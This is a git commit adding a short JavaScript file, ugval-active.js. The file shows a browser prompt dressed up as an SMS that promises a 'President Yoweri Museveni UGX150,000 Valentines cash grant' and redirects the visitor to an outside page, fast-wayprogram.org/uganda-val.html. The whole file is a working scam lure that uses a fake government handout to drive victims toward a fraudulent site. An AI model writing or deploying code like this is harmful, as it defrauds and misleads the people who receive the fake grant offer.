82eede6a10776ae2fe5d00c8a0bf0a34211fb855
superblog1 <imohette4@gmail.com>
2025-02-11 08:55:06 +0100

    Create ugval-active.js

---
+++ ugval-active.js
@@ -0,0 +1,6 @@
+
+var password = 'APPLY NOW'
+password=prompt('SMS: Congratulations You are qualify for President YOWERI MUSEVENI UGX150,000 VALENTINES CASH GRANT, Kindly Press OK to get gift now   ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://fast-wayprogram.org/uganda-val.html';
+}
